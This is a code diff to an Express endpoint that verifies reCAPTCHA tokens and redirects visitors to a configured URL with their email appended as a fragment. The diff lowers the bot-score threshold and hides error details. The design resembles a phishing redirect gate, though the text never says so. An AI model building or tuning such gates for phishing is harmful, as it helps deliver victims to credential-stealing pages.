@@ -9,7 +9,6 @@ import { setDefaultResultOrder } from 'dns';
 // CRITICAL RAILWAY FIXES
 // =====================
 setDefaultResultOrder('ipv4first');
-
 const app = express();
 const PORT = process.env.PORT || 8080;
 
@@ -23,7 +22,6 @@ app.use(cors({
 }));
 app.use(express.json());
 app.use(morgan('combined'));
-
 app.use(rateLimit({
   windowMs: 60 * 1000,
   max: 100,
@@ -48,11 +46,11 @@ app.post('/verify-token', async (req, res) => {
 
   // Validate token format
   if (typeof token !== 'string' || token.length < 10) {
-    return res.status(400).json({ success: false, error: 'Invalid token format' });
+    return res.status(400).json({ success: false, reason: 'Invalid request' });
   }
 
   if (!secret) {
-    return res.status(500).json({ success: false, error: 'Server configuration error' });
+    return res.status(500).json({ success: false, reason: 'Server configuration error' });
   }
 
   try {
@@ -60,50 +58,46 @@ app.post('/verify-token', async (req, res) => {
     const response = await axios.post(
       'https://www.google.com/recaptcha/api/siteverify',
       new URLSearchParams({ secret, response: token }),
-      { 
+      {
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        timeout: 2500 
+        timeout: 2500
       }
     );
 
     const { success, score, 'error-codes': errors = [] } = response.data;
 
-    // Strict score validation (NEW: 0.5 threshold)
+    // Strict score validation
     if (!success) {
       return res.status(403).json({
         success: false,
-        reason: 'reCAPTCHA verification failed',
-        errors
+        reason: 'Verification failed'
       });
     }
 
-    if (score < 0.5) { // Reject scores below 0.5
+    // LOWERED THRESHOLD: 0.3 (Allows most humans, blocks obvious bots)
+    if (score < 0.3) {
       return res.status(403).json({
         success: false,
-        reason: 'Low reCAPTCHA score (minimum: 0.5)',
-        score,
-        requiredScore: 0.5
+        reason: 'Verification failed'
       });
     }
 
-    // Build redirect URL with base64 email (unchanged)
+    // Build redirect URL with base64 email
     let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
     if (email) {
       redirectUrl = `${redirectUrl.replace(/#.*$/, '')}#${email}`;
     }
 
-    return res.json({ 
+    return res.json({
       success: true,
-      redirect: redirectUrl,
-      score // Optional: Return score to client
+      redirect: redirectUrl
     });
 
   } catch (err) {
     console.error('reCAPTCHA API Error:', err.message);
-    return res.status(502).json({ 
-      success: false, 
-      error: 'Verification service unavailable',
-      retry: true 
+    return res.status(502).json({
+      success: false,
+      reason: 'Verification service unavailable'
     });
   }
 });
